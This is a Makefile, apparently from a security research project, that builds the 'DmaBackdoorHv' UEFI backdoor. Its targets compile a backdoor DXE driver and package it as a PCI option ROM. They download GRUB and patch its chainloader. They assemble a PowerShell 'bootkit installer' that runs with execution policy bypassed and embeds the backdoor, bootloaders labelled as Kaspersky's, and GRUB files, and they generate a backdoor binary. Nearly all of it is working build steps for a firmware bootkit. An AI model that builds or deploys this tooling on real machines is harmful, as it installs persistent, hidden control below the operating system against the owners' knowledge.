
PROJ = DmaBackdoorHv

ARCH_64 = X64
PATH_64 = ..\..\Build\Ovmf$(ARCH_64)\DEBUG_VS2013x86\$(ARCH_64)\Cr4sh\$(PROJ)\$(PROJ)\OUTPUT

VENDOR_ID = 10ee
DEVICE_ID = 1337

INSTALLER = bootkit_installer.ps1

build:
	build
	@if exist $(PATH_64)\$(PROJ).efi copy $(PATH_64)\$(PROJ).efi .\$(PROJ)_$(ARCH_64).efi /Y
	@if exist $(PATH_64)\$(PROJ).pdb copy $(PATH_64)\$(PROJ).pdb .\$(PROJ)_$(ARCH_64).pdb /Y

rom:	
	EfiRom -f 0x$(VENDOR_ID) -i 0x$(DEVICE_ID) -o $(PROJ)_$(ARCH_64)_$(VENDOR_ID)_$(DEVICE_ID).rom -e $(PROJ)_$(ARCH_64).efi
	EfiRom -d $(PROJ)_$(ARCH_64)_$(VENDOR_ID)_$(DEVICE_ID).rom

chainloader:
	test -f grub-2.02.tar.gz || wget https://ftp.gnu.org/gnu/grub/grub-2.02.tar.gz
	test -f grub-2.02.tar.gz && tar -xpvf grub-2.02.tar.gz
	test -d grub-2.02 && patch -p1 grub-2.02/grub-core/loader/efi/chainloader.c < grub-2.02_chainloader.patch
	test -d grub-2.02 && cd grub-2.02 && ./configure --target=x86_64 --with-platform=efi --disable-werror && make
	test -f grub-2.02/grub-core/chain.mod && cp grub-2.02/grub-core/chain.mod resources/boot/grub/

installer:
# installer code begin
	echo param([switch]$$Install, [switch]$$Uninstall); > $(INSTALLER)
# backdoor DXE driver
	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\$(PROJ)_$(ARCH_64).efi -VarName Backdoor >> $(INSTALLER)
# first stage bootloader
	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\kaspersky_bl_1.efi -VarName Bootloader >> $(INSTALLER)
# second stage bootloader
	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\kaspersky_bl_2.efi -VarName Grub >> $(INSTALLER)
# patched chain.mod
	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\boot\grub\chain.mod -VarName GrubMod >> $(INSTALLER)
# bootloader config
	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\boot\grub\grub.cfg -VarName GrubCfg >> $(INSTALLER)
# rest of the installer code
	type .\resources\bootkit_installer_template.ps1 >> $(INSTALLER)

bin:
	python backdoor_gen.py --bin $(PROJ)_$(ARCH_64).efi --pdb $(PROJ)_$(ARCH_64).pdb --output backdoor.bin
